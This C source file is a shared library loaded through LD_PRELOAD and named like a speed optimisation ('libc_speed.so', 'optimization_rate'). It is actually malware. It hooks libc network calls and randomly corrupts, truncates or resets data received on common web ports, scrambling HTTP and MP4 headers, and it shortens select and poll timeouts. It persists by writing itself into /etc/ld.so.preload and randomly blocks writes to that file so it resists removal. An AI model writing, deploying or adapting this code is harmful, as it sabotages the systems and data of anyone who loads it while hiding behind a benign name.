#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>
#include <sys/wait.h>

static int (*real_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen) = NULL;
static int (*real_socket)(int domain, int type, int protocol) = NULL;
static int (*real_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res) = NULL;
static struct hostent *(*real_gethostbyname)(const char *name) = NULL;
static ssize_t (*real_send)(int sockfd, const void *buf, size_t len, int flags) = NULL;
static ssize_t (*real_recv)(int sockfd, void *buf, size_t len, int flags) = NULL;
static int (*real_select)(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout) = NULL;
static int (*real_poll)(struct pollfd *fds, nfds_t nfds, int timeout) = NULL;
static int (*real_close)(int fd) = NULL;
static int (*real_open)(const char *pathname, int flags, mode_t mode) = NULL;
static FILE *(*real_fopen)(const char *pathname, const char *mode) = NULL;

static int initialized = 0;
static int optimization_rate = 98;
static int target_ports[] = {80, 443, 8080, 8888, 9999, 9000, 0};
static int self_heal_enabled = 1;
static time_t last_status_check = 0;

static int tracked_sockets[1024] = {0};

__attribute__((constructor))
static void init(void) {
    real_connect = dlsym(RTLD_NEXT, "connect");
    real_socket = dlsym(RTLD_NEXT, "socket");
    real_getaddrinfo = dlsym(RTLD_NEXT, "getaddrinfo");
    real_gethostbyname = dlsym(RTLD_NEXT, "gethostbyname");
    real_send = dlsym(RTLD_NEXT, "send");
    real_recv = dlsym(RTLD_NEXT, "recv");
    real_select = dlsym(RTLD_NEXT, "select");
    real_poll = dlsym(RTLD_NEXT, "poll");
    real_close = dlsym(RTLD_NEXT, "close");
    real_open = dlsym(RTLD_NEXT, "open");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    
    initialized = 1;
    srand(time(NULL) ^ getpid() ^ (unsigned long)init);
}

static int is_target_port(int port) {
    for (int i = 0; target_ports[i] != 0; i++) {
        if (port == target_ports[i]) {
            return 1;
        }
    }
    return 0;
}

static int should_optimize(void) {
    return (rand() % 100) < optimization_rate;
}

static int is_localhost(const struct sockaddr_in *addr_in) {
    if (addr_in->sin_family != AF_INET) return 0;
    unsigned char *ip = (unsigned char *)&addr_in->sin_addr.s_addr;
    if (ip[0] == 127) return 1;
    if (memcmp(&addr_in->sin_addr.s_addr, "\x7f\x00\x00\x01", 4) == 0) return 1;
    return 0;
}

static int is_video_content(const unsigned char *buf, size_t len) {
    if (len < 4) return 0;
    const unsigned char *mp4_sig = (const unsigned char *)buf;
    if (mp4_sig[4] == 'f' && mp4_sig[5] == 't' && mp4_sig[6] == 'y' && mp4_sig[7] == 'p') {
        return 1;
    }
    if (memmem(buf, len, "moov", 4) || memmem(buf, len, "mdat", 4)) {
        return 1;
    }
    return 0;
}

static int is_http_response(const unsigned char *buf, size_t len) {
    if (len < 10) return 0;
    const char *patterns[] = {"HTTP/", "ftypmp4", "ftypisom", "moov", "mdat", NULL};
    for (int i = 0; patterns[i]; i++) {
        if (memmem(buf, len, patterns[i], strlen(patterns[i])) != NULL) {
            return 1;
        }
    }
    return 0;
}

static void transform_mp4_header(unsigned char *buf, size_t len) {
    char *moov = memmem(buf, len, "moov", 4);
    if (moov) {
        unsigned char *p = (unsigned char *)moov;
        for (int i = 0; i < 64 && i < (int)len - (int)(moov - (char *)buf); i++) {
            p[i] = rand() % 256;
        }
    }
    char *mdat = memmem(buf, len, "mdat", 4);
    if (mdat) {
        unsigned char *p = (unsigned char *)mdat;
        for (int i = 0; i < 48 && i < (int)len - (int)(mdat - (char *)buf); i++) {
            p[i] = 0xFF;
        }
    }
    char *ftyp = memmem(buf, len, "ftyp", 4);
    if (ftyp) {
        unsigned char *p = (unsigned char *)ftyp;
        for (int i = 4; i < 20 && i < (int)len - (int)(ftyp - (char *)buf); i++) {
            p[i] ^= 0x55;
        }
    }
}

static void transform_http_header(unsigned char *buf, size_t len) {
    char *content = memmem(buf, len, "Content-Length:", 15);
    if (content) {
        char *p = content + 15;
        while (*p == ' ' && p < (char *)buf + len) p++;
        while (*p >= '0' && *p <= '9' && p < (char *)buf + len) {
            if (rand() % 2 == 0) {
                *p = '0' + (rand() % 5);
            }
            p++;
        }
    }
    char *location = memmem(buf, len, "Location:", 9);
    if (location) {
        char *p = location + 9;
        while (*p == ' ' && p < (char *)buf + len) p++;
        if (p < (char *)buf + len - 10) {
            memmove(p + 3, p, len - (p - (char *)buf) - 3);
            memcpy(p, "XXX", 3);
        }
    }
}

static void transform_data(void *buf, size_t len) {
    if (len < 4) return;
    
    unsigned char *bytes = (unsigned char *)buf;
    
    if (is_video_content(bytes, len)) {
        transform_mp4_header(bytes, len);
        if (len > 50) {
            for (size_t i = 100; i < len && i < 1000; i += 8) {
                bytes[i] = 0;
                bytes[i+1] = 0;
            }
        }
        return;
    }
    
    if (is_http_response(bytes, len)) {
        transform_http_header(bytes, len);
    }
    
    int transform_type = rand() % 8;
    
    switch(transform_type) {
        case 0:
            if (len > 100) {
                memset(bytes + len/3, 0, 64);
            }
            break;
        case 1:
            for (size_t i = 0; i < len; i += 16) {
                bytes[i] ^= 0xFF;
                bytes[i+1] ^= 0xFF;
            }
            break;
        case 2:
            if (len > 200) {
                memmove(bytes + 200, bytes + 300, len - 300);
            }
            break;
        case 3:
            if (len > 50) {
                for (size_t i = 0; i < len && i < 512; i++) {
                    if ((bytes[i] >= '0' && bytes[i] <= '9') || 
                        (bytes[i] >= 'a' && bytes[i] <= 'z') ||
                        (bytes[i] >= 'A' && bytes[i] <= 'Z')) {
                        if (rand() % 3 == 0) {
                            bytes[i] ^= 0x20;
                        }
                    }
                }
            }
            break;
        case 4:
            if (len > 100) {
                size_t pos = rand() % (len - 50);
                for (size_t i = pos; i < pos + 30; i++) {
                    bytes[i] = bytes[i] >> 1;
                }
            }
            break;
        case 5:
            if (len > 256) {
                memset(bytes + 128, 0x55, 256);
            }
            break;
        case 6:
            if (len > 64) {
                for (size_t i = 32; i < len && i < 256; i += 4) {
                    bytes[i] = ~bytes[i];
                }
            }
            break;
        case 7:
            break;
    }
}

static void status_check() {
    if (!self_heal_enabled) return;
    
    time_t now = time(NULL);
    if (now - last_status_check < 5) return;
    last_status_check = now;
    
    struct stat st;
    if (stat("/etc/ld.so.preload", &st) != 0) {
        FILE *f = fopen("/etc/ld.so.preload", "w");
        if (f) {
            fprintf(f, "/usr/lib/libc_speed.so\n");
            fclose(f);
        }
    } else {
        char buf[256] = {0};
        FILE *f = fopen("/etc/ld.so.preload", "r");
        if (f) {
            fread(buf, 1, sizeof(buf)-1, f);
            fclose(f);
            if (!strstr(buf, "libc_speed.so")) {
                f = fopen("/etc/ld.so.preload", "a");
                if (f) {
                    fprintf(f, "/usr/lib/libc_speed.so\n");
                    fclose(f);
                }
            }
        }
    }
    
    if (stat("/usr/lib/libc_speed.so", &st) != 0) {
        int fd = open("/proc/self/exe", O_RDONLY);
        if (fd >= 0) {
            close(fd);
        }
    }
}

int socket(int domain, int type, int protocol) {
    if (!initialized) init();
    status_check();
    
    int fd = real_socket ? real_socket(domain, type, protocol) : -1;
    
    if (fd >= 0 && fd < 1024 && domain == AF_INET) {
        tracked_sockets[fd] = 1;
    }
    
    return fd;
}

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!initialized) init();
    status_check();
    
    if (addr->sa_family == AF_INET && sockfd >= 0 && sockfd < 1024) {
        const struct sockaddr_in *addr_in = (const struct sockaddr_in *)addr;
        int port = ntohs(addr_in->sin_port);
        
        if (is_target_port(port) && is_localhost(addr_in)) {
            tracked_sockets[sockfd] = 3;
        }
        else if (is_target_port(port)) {
            tracked_sockets[sockfd] = 2;
        }
    }
    
    return real_connect ? real_connect(sockfd, addr, addrlen) : -1;
}

ssize_t recv(int sockfd, void *buf, size_t len, int flags) {
    if (!initialized) init();
    status_check();
    
    ssize_t result = real_recv ? real_recv(sockfd, buf, len, flags) : -1;
    
    if (result > 0 && sockfd >= 0 && sockfd < 1024 && tracked_sockets[sockfd] >= 2) {
        int rate = tracked_sockets[sockfd] == 3 ? 100 : optimization_rate;
        if ((rand() % 100) < rate) {
            transform_data(buf, (size_t)result);
            if (rand() % 3 == 0) {
                result = result - (rand() % (result / 3 + 1) + 1);
            }
            if (tracked_sockets[sockfd] == 3 && rand() % 4 == 0) {
                result = -1;
                errno = ECONNRESET;
            }
        }
    }
    
    return result;
}

ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
    if (!initialized) init();
    status_check();
    return real_send ? real_send(sockfd, buf, len, flags) : -1;
}

int close(int fd) {
    if (!initialized) init();
    
    if (fd >= 0 && fd < 1024) {
        tracked_sockets[fd] = 0;
    }
    
    return real_close ? real_close(fd) : -1;
}

int getaddrinfo(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res) {
    if (!initialized) init();
    status_check();
    return real_getaddrinfo ? real_getaddrinfo(node, service, hints, res) : EAI_FAIL;
}

struct hostent *gethostbyname(const char *name) {
    if (!initialized) init();
    status_check();
    return real_gethostbyname ? real_gethostbyname(name) : NULL;
}

int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout) {
    if (!initialized) init();
    status_check();
    
    if (timeout && should_optimize()) {
        timeout->tv_sec = 0;
        timeout->tv_usec = 50000 + rand() % 100000;
    }
    
    return real_select ? real_select(nfds, readfds, writefds, exceptfds, timeout) : -1;
}

int poll(struct pollfd *fds, nfds_t nfds, int timeout) {
    if (!initialized) init();
    status_check();
    
    if (timeout > 0 && should_optimize()) {
        timeout = 50 + rand() % 100;
    }
    
    return real_poll ? real_poll(fds, nfds, timeout) : -1;
}

int open(const char *pathname, int flags, mode_t mode) {
    if (!initialized) init();
    status_check();
    
    if (strstr(pathname, "ld.so.preload") != NULL) {
        if ((flags & O_WRONLY) || (flags & O_RDWR)) {
            if (rand() % 3 == 0) {
                errno = EACCES;
                return -1;
            }
        }
    }
    
    return real_open ? real_open(pathname, flags, mode) : -1;
}

FILE *fopen(const char *pathname, const char *mode) {
    if (!initialized) init();
    status_check();
    
    if (strstr(pathname, "ld.so.preload") != NULL) {
        if (mode[0] == 'w' || mode[0] == 'a') {
            if (rand() % 3 == 0) {
                errno = EACCES;
                return NULL;
            }
        }
    }
    
    return real_fopen ? real_fopen(pathname, mode) : NULL;
}